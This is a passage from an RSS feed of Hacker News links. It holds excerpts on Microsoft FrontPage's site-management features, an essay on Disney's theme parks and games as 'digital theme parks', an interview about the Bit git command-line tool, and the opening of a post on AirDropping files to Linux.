<p>Another really neat feature: reports. Like a compiler in an IDE, FrontPage produces warnings, errors, and statistics for your site. At a glance I can view all broken links, orphaned pages, oversized images, etc. This is a <em>fantastic</em> feature, something that modern web dev software just <em>doesn't</em> have.</p>
<p><img alt="Hyperlinks view window" src="https://invisibleup.com//articles/33/FP-Links.png"></p>
<p>In the same vein as the Reports, you can see at a glance what links to what. It's a lot like the call chart in a software development IDE. I can see quickly every site linked from any page (shown here is <a href="https://invisibleup.com//articles/24/">the Sonic R color fix article</a>) and any subpages.</p>
<p><img alt="Tasks view, showing a task labeled &quot;Write FrontPage article&quot;" src="https://invisibleup.com//articles/33/FP-Tasks.png"></p>
<p>Last feature, although this isn't nearly as useful in the year 2020. In the tasks view, you can put up a list of tasks that needs to be accomplished. Already that seems rather nice for keeping track of what you need to do. It's a lot like GitHub or GitLab's issue tracker, in a sense.</p>
<p>However, if you connect to a server with FrontPage Web Extensions (I'll get to that...), you can share this task list with other people. You can (again, like an issue tracker) put up a task to be done by someone else and work on a task that somebody else put up. It's a <em>very</em> nice feature for web development, but nowadays this is normally handled by source control providers like GitHub or GitLab.</p>
<p><img alt="FrontPage editing the Sonic R color mod article" src="https://invisibleup.com//articles/33/FP-Editor.png"></p>
<p>And, of course, there's the webpage editor. This works almost exactly like Microsoft Word, with some web-flavored spice. You type words and they appear in the page. You make those words blue, they're blue. <em>That said</em>, when you edit elements like that, it inserts an HTML 3.2 style <code>&lt;FONT&gt;</code> tag instead of trying to match it to a CSS rule. There's ways around this, but you have to be very diligent in doing so. This is mostly just due to FrontPage being a product of its time, though.</p>
<p>FrontPage is a program about planning, executing, and reviewing. Take the Navigation editor. You plan out the content of your site. You sketch up the layout. Then you reflect on if your layout matches your requirements. Or the Reports. Create content, check reports. Or the Tasks. Plan out what you need to do, do that, and then check if the task is complete. That, right â€¦</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://invisibleup.com//articles/33/">https://invisibleup.com//articles/33/</a></em></p>]]>
            </description>
            <link>https://invisibleup.com//articles/33/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25155442</guid>
            <pubDate>Thu, 19 Nov 2020 23:06:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital Theme Park Platforms: The Most Important Media Businesses of the Future]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25155314">thread link</a>) | @natex
<br/>
November 19, 2020 | https://www.matthewball.vc/all/digitalthemeparkplatforms | <a href="https://web.archive.org/web/*/https://www.matthewball.vc/all/digitalthemeparkplatforms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main">
        
          <article data-page-sections="5d8e94500fa50d2aaaa7c406" id="sections">
  
    <section data-section-id="5d8e94500fa50d2aaaa7c408" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.15,
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 1,
&quot;filterStrength&quot;: 0,
&quot;zoom&quot;: 0
},
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
&quot;customSectionHeight&quot;: 10,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
&quot;customContentWidth&quot;: 50,
&quot;sectionTheme&quot;: &quot;&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-content-field="main-content" data-item-id="">
  <article id="article-">
  
    <div>
      

      <div>
        <div><div data-layout-label="Post Body" data-type="item" id="item-5e644cbd1f4bbe1201cae5d2"><div><div><div data-block-type="5" id="block-509f2b77bcb05cb3a13e"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583631643226-40206LFTFFRWCM9H2G48/ke17ZwdGBToddI8pDm48kFTEgwhRQcX9r3XtU0e50sUUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcW7uEhC96WQdj-SwE5EpM0lAopPba9ZX3O0oeNTVSRxdHAmtcci_6bmVLoSDQq_pb/maxresdefault.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583631643226-40206LFTFFRWCM9H2G48/ke17ZwdGBToddI8pDm48kFTEgwhRQcX9r3XtU0e50sUUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcW7uEhC96WQdj-SwE5EpM0lAopPba9ZX3O0oeNTVSRxdHAmtcci_6bmVLoSDQq_pb/maxresdefault.jpg" data-image-dimensions="1280x720" data-image-focal-point="0.5,0.5" alt="maxresdefault.jpg" data-load="false" data-image-id="5e644d1bad7cab40b9b19f03" data-type="image" src="https://www.matthewball.vc/all/maxresdefault.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-83d26a75802dd2ca90d0"><div><p><span><strong><em>Chapter One: The Past </em></strong></span></p><p>Disney is the envy of every media company, regardless of whether it focuses on film, TV, gaming, music or publishing. In plain terms, there has never been a more dominant entertainment company, globally or in the US. It has a brand that actually matters to consumers, owns franchises that consumers essentially treat like subscription content services, and operates the biggest star-making platforms in the world. And as strong as this platform was at the start of 2019, it exited the year even stronger. In a matter of weeks, Disneyâ€™s brand new direct-to-consumer platform acquired 30MM subscribers.</p><p>The deeper we get into the digital era, the more dominant Disney seems to become. After all, it was long expected that the Internet would disrupt dominant media companies and IP via rights infringement and the emergence of myriad user-generated â€œfranchisesâ€. However, one of the biggest storytelling â€œlessonsâ€ in the 20th and early 21th century was that audiences have an unending desire for â€œmoreâ€ of the stories they <em>already </em>love. And the Internet has enabled this to an unprecedented degree. You can constantly track production (cast Instagrams, behind-the-scenes featurettes, and leaks on social media), engage in fan communities (message boards and YouTube theory/Easter egg videos), consume endless amounts of fan content (e.g. fanfic and watch-along podcasts), play this content back on demand (e.g. Netflix), and engage in never-ending and constantly updated online multiplayer games (e.g. Star Wars: Battlefront 2). This is a powerful, self-sustaining financial and cultural flywheel. And Disney has many of the franchises that best lend themselves to this model. Many of those they donâ€™t own, such as <em>Harry Potter</em>, have their rights fragmented.</p><p>But what is the strongest, most profitable, most defensible part of Disneyâ€™s business in the digital era? Its capex-heavy, physical theme parks.</p><p>There is no simple way to quantify how important this business unit is to Disney. The financial role is obvious. Disneyâ€™s Parks &amp; Attractions segment generates nearly 100% more revenue and 60% more profit than Disneyâ€™s studio division (which already generates nearly three times the revenue AND three times the gross <em>margins </em>as its primary competitors). By turning hit films into theme park attractions, not only does Disney generate more â€œupsideâ€ from a hit than its competitors do, Disneyâ€™s breakeven point for these films is also much lower. But the parks are much more than this direct financial benefit. There is nothing that can compare to the impact of a child being hugged by her heroes. The ability to enjoy your favorite IP as â€œyouâ€ is unique and lasts a lifetime. Consider, for example, how many families have Disneyland photos of their kids with Mickey or Woody on the fridge. Or how many of these kids have kept those photos decades later (and compared them to their eventual spouseâ€™s version of that same photo).</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1583704876360_17902"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704955879-DXS743LVFW9K8XHLJW04/ke17ZwdGBToddI8pDm48kEbi0xOcUBMPtPJ1nKxl34J7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iqinJXUwCvfZzt2c3UTmyH0_133MZg2Ed6tGbaptjvtwPfRGq2WUoRdTo2H3IkSnA/Comparison.png" data-image="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704955879-DXS743LVFW9K8XHLJW04/ke17ZwdGBToddI8pDm48kEbi0xOcUBMPtPJ1nKxl34J7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iqinJXUwCvfZzt2c3UTmyH0_133MZg2Ed6tGbaptjvtwPfRGq2WUoRdTo2H3IkSnA/Comparison.png" data-image-dimensions="2500x1247" data-image-focal-point="0.5,0.5" alt="Jacob Navok  with his father in 1986; Jacob Navok with his son in 2020" data-load="false" data-image-id="5e656b6de2671908cf0b1c50" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704955879-DXS743LVFW9K8XHLJW04/ke17ZwdGBToddI8pDm48kEbi0xOcUBMPtPJ1nKxl34J7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iqinJXUwCvfZzt2c3UTmyH0_133MZg2Ed6tGbaptjvtwPfRGq2WUoRdTo2H3IkSnA/Comparison.png">
          </p>
        
          
        

        
          
          <figcaption>
            <p><a href="https://twitter.com/jnavok?lang=en">Jacob Navok</a> with his father in 1986; Jacob Navok with his son in 2020</p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583704876360_24796"><div><p>And because of real estate scarcity, lengthy build times, enormous capital requirements (exacerbated by<a href="http://en.wikipedia.org/wiki/Baumol's_cost_disease"> Baumolâ€™s Cost Disease</a>), Disneyâ€™s theme parks, resorts, and cruises are incredibly difficult to replicate by another Western media company. It would take twenty years and tens of billions of dollars for AT&amp;T/WarnerMedia to receive permits, design attractions, and build a fully operational theme park, for example (and itâ€™d probably be in the middle of nowhere). Itâ€™s especially hard to imagine all of this occurring while the company is investing tens of billions per year into HBO Max, new 5G network infrastructure, and maintenance capex (while also sustaining tens of billions in dividends and debt service, and fending off agitated investors). Comcast/Universal has an ambitious plan to grow its parks footprint, including new resorts in Russia, South Korea, and Singapore. However, these will take years and tens of billions of dollars. Purely comping the number of parks also overlooks the scale differential. Disneyâ€™s Orlando resort, for example, is over 25,000 acres (half used). Universal Studios Orlando is barely 500. In addition, Disney operates four cruise ships (another three are due by 2023), while no competitor does. Overall, Disneyâ€™s theme parks business generates more than $26B per year with 175MM+ visitors, compared to 6B for Universal Studios, with 50MM.</p><p>However, the defensibility and value of these businesses goes beyond physical and financial barriers to entry; running a successful theme park means far more than designing a fun ride. Giving real hugs to kids is incredibly dangerous â€” doing this reliably, safely, and positively millions of times per year requires enormous training (the parks also operate hospitals, pet day care and police services, too!). In addition, these parks must cater to a wide variety of different customers with different needs, physical capabilities, and developmental maturity. In contrast, a film or TV show has only one version that lasts forever and is infinitely repeatable with 100% consistency. There is no other â€œmediumâ€ in the entertainment industry that requires melding more art forms (e.g. live performance, set design, music, engineering) with a smaller margin for error, and at such a great scale. The benefit, though, is a rich, hard to replicate and intimate understanding of the consumer.</p><p>The competitive consequences are profound and only growing. Fans simply cannot enjoy DC or Lord of the Rings or Dragon Ball the way they do Disneyâ€™s Princesses, Pixar, most recently, Star Wars, and soon, the Avengers franchises. This fundamentally limits a franchiseâ€™s ability to grow love â€” the lifeblood (and profit driver) of all IP-based companies.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1583703445914_105588"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <a href="https://www.matthewball.vc/all/marginalaffinity" data-animation-role="image" data-description="">
            
            <img data-src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704276350-57SC1180IMU577Q1G2VV/ke17ZwdGBToddI8pDm48kHOrWH00r8lczZbSY6Q3rqZZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIs8DdG5mDMJJVuX1u-bmhC-P6JCcY2JAH49h2IsMFZkcKMshLAGzx4R3EDFOm1kBS/worship-cat-egypt-750x477.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704276350-57SC1180IMU577Q1G2VV/ke17ZwdGBToddI8pDm48kHOrWH00r8lczZbSY6Q3rqZZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIs8DdG5mDMJJVuX1u-bmhC-P6JCcY2JAH49h2IsMFZkcKMshLAGzx4R3EDFOm1kBS/worship-cat-egypt-750x477.jpg" data-image-dimensions="750x365" data-image-focal-point="0.5,0.5" alt="worship-cat-egypt-750x477.jpg" src="https://www.matthewball.vc/all/worship-cat-egypt-750x477.jpg">
            
          
            </a>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              

              
                <div></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583703445914_134473"><div><p>This is why brands like 20th Century Fox and WarnerMedia license their theme park IP from super-popular brands like <em>Avatar</em>, <em>The Simpsons</em>, and <em>Harry Potter</em> to their competitors, Disney and Universal. Nintendo also partnered with Universal for its theme park rights. This extension is strategically important and financially valuable, but itâ€™s also quite costly. The rights owner, for example, neither owns the customer relationship nor do they deliver the end-customer experience (in a weird way, Universal has a closer relationship with <em>Harry Potter</em> fans than WarnerMedia does). In addition, the majority of associated profits go to the park operator â€” who also gets to intermingle their IP and draft off the popularity of their competitorsâ€™ franchises, too. Thatâ€™s risky in an age where franchises and <a href="https://www.matthewball.vc/all/disneylessons">clarity of franchise ownership is key</a>.</p><p>So, as we embrace the digital era, itâ€™s funny to consider the enduring and durable significance of the analogue theme parks business. It is incredibly profitable and will continue to grow as new mobile technology/personalization enhance the park-going experience. The barriers to replication are incredibly high and span both fixed investment (land and infrastructure) and skillset (e.g. design and boots-on-the-ground operations). It also offers an intimate understanding of the consumer, is particularly potent when connected to an IP flywheel, and is able to constantly renew its appeal through new attractions and updates.</p><p><span><strong><em>Chapter Two: The (Start of the) New Theme Parks</em></strong></span></p><p>These parks exist and thrive because of our desire to be â€œinside a living storyâ€. This was Waltâ€™s primary goal with Disneyland: to go beyond passive consumption and into active immersion. Consider the following quote from one of Disneyâ€™s chief Imagineers: </p><blockquote><p><em>â€œDisneyland is an experience involving many moving parts in harmony, like an orchestra. Everything has to be tuned, what you hear, what you smell, what you see, how you see it, the speed at which you assimilate all of that, just like a film, is choreographed. But how do you choreograph that if you don't control the camera, because the camera is you â€” it's you when you come to Disneyland".</em></p></blockquote><p>This idea of agency is key. Thereâ€™s only so much time one can spend in a physical or virtual world as a pre-defined character. That doesnâ€™t mean we want to remain an exact replica of our â€œIRLâ€ selves â€” we might want to be taller, or blue, or metal, and so on. But when youâ€™re <em>specifically </em>Iron Man, there are limits to what you can look like, how you can behave, what you can do or be, where you can go, and how long it makes sense to be there. After all, you canâ€™t actually be Iron Man, just pretend to be. And certainly, it doesnâ€™t make sense if all of your friends are all Iron Man, too.</p></div></div><div data-block-json="{&quot;cache_age&quot;:&quot;3153600000&quot;,&quot;authorUrl&quot;:&quot;https://twitter.com/DonaldMustard&quot;,&quot;width&quot;:550,&quot;resolveObject&quot;:&quot;Tweet&quot;,&quot;html&quot;:&quot;<blockquote class=\&quot;twitter-tweet\&quot;><p lang=\&quot;en\&quot; dir=\&quot;ltr\&quot;>In Fortnite you will always be you. Agency is the key.</p>\u2014 Donald Mustard (@DonaldMustard) <a href=\&quot;https://twitter.com/DonaldMustard/status/1205968434690838529?ref_src=twsrc%5Etfw\&quot;>December 14, 2019</a></blockquote>\n<script async=\&quot;\&quot; src=\&quot;https://platform.twitter.com/widgets.js\&quot; charset=\&quot;utf-8\&quot;></script>&quot;,&quot;url&quot;:&quot;https://twitter.com/DonaldMustard/status/1205968434690838529&quot;,&quot;resolvedBy&quot;:&quot;twitter&quot;,&quot;authorName&quot;:&quot;Donald Mustard&quot;,&quot;version&quot;:&quot;1.0&quot;,&quot;resolved&quot;:true,&quot;type&quot;:&quot;rich&quot;,&quot;providerName&quot;:&quot;Twitter&quot;,&quot;providerUrl&quot;:&quot;https://twitter.com&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1583703445914_20087"><div><blockquote><p lang="en" dir="ltr">In Fortnite you will always be you. Agency is the key.</p>â€” Donald Mustard (@DonaldMustard) <a href="https://twitter.com/DonaldMustard/status/1205968434690838529?ref_src=twsrc%5Etfw">December 14, 2019</a></blockquote>
</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583703454850_7992"><div><p>For decades, the only real way to experience a digital world with agency and an individual sense of self was to go to the theme park. Games have been on the cusp of these experiences for years, but in 2020, theyâ€™re well under way. These are â€œgamesâ€ like Minecraft, Fortnite, Roblox, to a lesser extent GTA Online, and PokÃ©mon Go. </p><p>These titles offer many unique advantages compared to their analogue analogues. For example, they are always â€œopenâ€, â€œeverywhereâ€, â€œfull of your friendsâ€, and â€¦</p></div></div></div></div></div></div></div></div></article></div></div></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.matthewball.vc/all/digitalthemeparkplatforms">https://www.matthewball.vc/all/digitalthemeparkplatforms</a></em></p>]]>
            </description>
            <link>https://www.matthewball.vc/all/digitalthemeparkplatforms</link>
            <guid isPermaLink="false">hacker-news-small-sites-25155314</guid>
            <pubDate>Thu, 19 Nov 2020 22:51:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reimagining the Git CLI: an interview with the creator of Bit]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25154943">thread link</a>) | @chriswalz
<br/>
November 19, 2020 | https://chriswalz.com/posts/an-interview-with-chris-walz-of-bit/ | <a href="https://web.archive.org/web/*/https://chriswalz.com/posts/an-interview-with-chris-walz-of-bit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="js-article">
    <p><em>This interview was hosted by Jackson Kelley from Console originally posted <a href="https://console.substack.com/p/console-23">here</a></em></p>
<h3 id="what-is-your-background">What is your background?</h3>
<p>I was born and raised in NY. I started off with the privilege of working as an intern at Google. I then moved on to working in FinTech, InsurTech, and now Construction Tech (ConstruTech?). I enjoy my fair share of table tennis and gaming. (Fun fact: I once reached the #1 rank on the StarCraft 2 ladder (2v2s))</p>
<p>My first foray into programming was in High School. I took a computer science intro course and made some cool things like a flash game where each sprite was a meme from Reddit rage comics. However, I didnâ€™t feel confident in my programming abilities and ended up majoring in Accounting instead. I quickly realized that Accounting was not for me ğŸ˜… and switched to Finance. Halfway through college, I started reading about programming and it â€œclickedâ€. I began experimenting with Android programming (Shout out to <a href="https://www.amazon.com/Android-Programming-Ranch-Guide-Guides/dp/0321804333">The Big Nerd Ranch Guide</a>) and never stopped coding since then. You can check out my old Flappy Bird inspired Android game <a href="https://play.google.com/store/apps/details?id=com.walz.joltimate.downfall2&amp;hl=en_US">here</a>. All in all, I graduated with a B.S. in Finance and a minor in Computer Science.</p>
<p>My favorite language is Go but I mostly use Java and JavaScript during work. I try to steer away from using frameworks when I can but I like the Go web framework Echo. I use React + Redux although Iâ€™ve come to realize over time that Redux is overused and leads to too much global state.</p>
<h3 id="why-do-you-try-to-avoid-frameworks">Why do you try to avoid frameworks?</h3>
<p>Frameworks tend to have magic which can be convenient but also frustrating to work with when you want more customization or youâ€™re dealing with a nasty bug which turns out to be the framework silently undermining you. This is not to say that you shouldnâ€™t use frameworks and it goes on a case by case basis.  Frameworks are usually â€œhigh levelâ€ and hide details. This is convenient but if youâ€™re simply seeking to learn how to code this may not be beneficial.</p>
<p>Libraries are easier to wrap your head around since it will only do something if you explicitly tell it to do so. In turn, one can more easily rule out whether a bug is due to a library for example. The whole system of a computer operates like this to an extent. There are applications built to run on an operating system that runs commands on the kernel which in turn interfaces with the hardware. This system of components and layers is only possible due to APIâ€™s/Libraries.</p>
<h3 id="why-was-bit-started">Why was bit started?</h3>
<p>Bit is the summation of a passion for UX, laziness, and a healthy frustration with gitâ€™s CLI. Gitâ€™s CLI, as many of its users know, has a plethora of commands and options. When you multiply out all the combinations of commands by the number of options and their potential parameters you get A LOT of choices. On top of that, thereâ€™s the cornucopia of jargon (detach, head, ref, commit to name a few) and abstruse know-how that, in conjunction, can seduce you into a monotonous hell hole of learning the internal workings of git. Or perhaps put another way â€“ you begin to understand why there is a 500-page book about git. Itâ€™s worth pointing out that I like git â€“ but I also enjoy the cathartic pleasure of poking fun at it. Much respect to Linus and all the maintainers that have brought git to where it is today.</p>
<p>So anywayâ€¦ the inklings of bit began when I started asking myself why doesnâ€™t gitâ€™s CLI do this? Why doesnâ€™t git have an undo button? At some point, I said enough is enough, opened an editor, and started writing some code. Bit started out as this grand new git workflow that would completely change the way people would use git. Or at least that was the plan. After developing it and showing it to some friends I got the vibe that perhaps bit was too opinionated and I decided to dial back some of the changes and focus on an improved UX experience. It started all coming together â€“ intelligent suggestions, branches sorted by most recent, proactive fast-forwarding to avoid merge conflicts and full compatibility with all git commands. A lot of this either alleviates the â€œmaintenanceâ€ type tasks of git or helps reduce the working memory that git takes to allow you to focus more on the task at hand.</p>
<p>Bit has come a long way in such a short period of time considering the very first commit was only just over a month ago. Seeing all the overwhelmingly positive feedback is almost surreal and Iâ€™m thankful to all its supporters.  Itâ€™s even cooler working with folks across the world to make bit a bit better each day.</p>
<h3 id="are-there-any-overarching-goals-of-bit-that-drive-design-or-implementation">Are there any overarching goals of bit that drive design or implementation?</h3>
<p>Ease. Of. Use. I love simple interfaces (Google Search, Docker Run, the â€œEasy Buttonâ€).  Google Docs is a powerful interface as well (albeit not quite as simple). It does some complex work behind the scenes such as automatic saving, automatic synchronization &amp; distribution, automatic versioning (yes, Google Docs does that as well). It made me wonder how those principles can be applied to version control.  This became the inspiration for the <code>bit sync</code> command.</p>
<p>Put the onus on the program, not the user. Some of bitâ€™s naysayers claim that higher-order commands (e.g. bit sync, git pull) take away from the userâ€™s understanding. Personally, I find that to be a rather weak argument. Abstractions are powerful. Small interfaces are better than large ones. Bit allows you to use all git commands anyway so the trade-off is mitigated in this way.</p>
<h3 id="what-is-the-most-challenging-problem-thats-been-solved-in-bit-so-far">What is the most challenging problem thatâ€™s been solved in bit so far?</h3>
<p>There have been many challenges:  creating a uniform experience across Operating Systems and Shells,  implementing tab completion, displaying fast interactive prompts, simple installs, and lastly learning lots about git itself ğŸ˜…. Iâ€™d say the biggest challenge I solved(ish) is marketing! Marketing is hard. Even harder for programmers. I posted all over the internetz. Reddit, Discord, Twitter, StackOverflow, and even got my first couple of Stars via a link from another Github repo. Of course, Hacker News was the most successful, hitting #2 on the front page. Interestingly, the first time I posted it fell by the wayside with a measly 5 points ğŸ¤·â€â™‚ï¸. All of this marketing took a lot of time and consideration to get the messaging right on the posts and the landing page (Github README). Not to mention the worry that itâ€™d all be for naught.</p>
<h3 id="is-bit-intended-to-eventually-be-monetized-if-it-isnt-monetized-already">Is bit intended to eventually be monetized if it isnâ€™t monetized already?</h3>
<p>Git is free and open-source so I feel it is only right to continue forward in that spirit and keep bit free and open-source.</p>
<p><a href="https://github.com/sponsors/chriswalz">Donations</a> are welcome though (wink, wink)!</p>
<h3 id="where-do-you-see-bit-heading-next">Where do you see bit heading next?</h3>
<p>Continued innovation of the UX. Polishing the small details that â€œdelight the user.â€ The dream goal would be to make such an impact that Gitâ€™s CLI UX itself would improve due to the success of bit. Another interesting avenue would be bit aliases that could be written in Go. I hope bit inspires future developers about how the CLI experience, in general, can be improved. I think <a href="https://fishshell.com/">Fish</a> is doing great work on this front (I had the pleasure of discovering it during my research for bit).  I look forward to the continuing innovation of the shell/CLI space.</p>
<h3 id="where-do-you-see-software-development-in-general-heading-next">Where do you see software development, in general, heading next?</h3>
<p>Tough question! There are many possibilities considering how quickly innovation happens nowadays. My instinct tells me â€œNo-Codeâ€ and â€œLow-Codeâ€ solutions will become increasingly common. Perhaps it will be more visually based where a designer literally draws out a system and an AGI figures out the details (or vice-versa). Maybe even further into the future we will all be hooked up to a Neuralink and code will just spew out of our brains and then weâ€™ll all understand why thereâ€™s a programming language called Brain****.</p>
<h3 id="where-do-you-see-open-source-heading-next">Where do you see open-source heading next?</h3>
<p>Iâ€™m rather new to open-source so take my thoughts with a grain of salt. Open-source appears to have a bright future. There seems to be a need for continued innovation around licensing to prevent companies from taking advantage of open-source projects.</p>
<p>GitHub introduced Sponsoring is a fantastic way to <a href="https://github.com/sponsors/community">give back</a> to the open-source community.</p>
<p>I think there should be significantly more financial support for projects. Itâ€™s unfortunate to see so many projects stop getting maintained over time considering how fundamental they are to companies, big and small. Perhaps implementing some sort of government open-source Incentive program that encourages businesses to donate to open-source projects would make open-source flourish even more.</p>
<p>Also, bringing more attention to open-source through what Console is doing is really great to see.</p>
<h3 id="what-is-one-question-you-would-like-to-ask-another-open-source-developer-that-i-didnt-ask-you">What is one question you would like to ask another open-source developer that I didnâ€™t ask you?</h3>
<p>How do you go about resolving an issue (specifically bugs) that a user files?</p>
<h3 id="what-is-the-best-way-for-a-new-developer-to-contribute-to-bit">What is the best way for a new developer to contribute to bit?</h3>
<p>Submitting issues &amp; pull requests is nice. Also, changes to the README is quite useful (even with all the fallout from Hacktoberfest!). Look at the <a href="https://github.com/chriswalz/bit/issues">issues</a> page and look for â€œgood first issueâ€ labels. Also, if you feel like you <a href="https://en.wikipedia.org/wiki/Impostor_syndrome">donâ€™t know what youâ€™re doing</a> â€“ donâ€™t worry, no one does ğŸ˜›.</p>

  </section></div>]]>
            </description>
            <link>https://chriswalz.com/posts/an-interview-with-chris-walz-of-bit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154943</guid>
            <pubDate>Thu, 19 Nov 2020 22:08:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[China poised to overtake the US as the world leader in AI]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25154748">thread link</a>) | @lawschool333
<br/>
November 19, 2020 | https://www.pairagraph.com/dialogue/e146661eca504e4d9edeb1d68fc8f2f6/2 | <a href="https://web.archive.org/web/*/https://www.pairagraph.com/dialogue/e146661eca504e4d9edeb1d68fc8f2f6/2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.pairagraph.com/dialogue/e146661eca504e4d9edeb1d68fc8f2f6/2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154748</guid>
            <pubDate>Thu, 19 Nov 2020 21:43:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to AirDrop to Linux]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25154508">thread link</a>) | @gtf21
<br/>
November 19, 2020 | https://ro-z.net/blog/ios-development/how-to-airdrop-to-linux-part-1/ | <a href="https://web.archive.org/web/*/https://ro-z.net/blog/ios-development/how-to-airdrop-to-linux-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<div><figure><img loading="lazy" src="https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted-1024x762.png?resize=512%2C381&amp;ssl=1" alt="" width="512" height="381" srcset="https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?resize=1024%2C762&amp;ssl=1 1024w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?resize=300%2C223&amp;ssl=1 300w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?resize=768%2C571&amp;ssl=1 768w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?resize=1536%2C1143&amp;ssl=1 1536w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?resize=403%2C300&amp;ssl=1 403w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?w=1601&amp;ssl=1 1601w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?w=1168&amp;ssl=1 1168w" sizes="(max-width: 512px) 100vw, 512px" data-recalc-dims="1"><figcaption>A Father and Son File Sharing App Project</figcaption></figure></div>



<p>I mostly work and play within the Apple ecosystem and <a href="https://support.apple.com/en-gb/HT204144">AirDrop</a>, <a href="https://support.apple.com/en-gb/HT204681">Continuity</a> and other integration between devices is extremely useful and convenient. <a href="https://llguy.github.io/">My son</a> recently converted himself to Linux and started to miss the ability to easily move photos, text, or url between his phone and his Linux computer. Being a hacker himself, he thought it would be a great idea to devise an app that letâ€™s you move information from your phone to your computer, and more generally a â€œcross platform AirDrop substitute for geeksâ€â€¦</p>



<p>Of course, one solution would be to <a href="http://www.google.com/search?q=how+to+airdrop+to+linux">google</a> and figure out if such an app exists, but where is the fun in that? We decided to take on a Father-Son new project and build our own solution. </p>



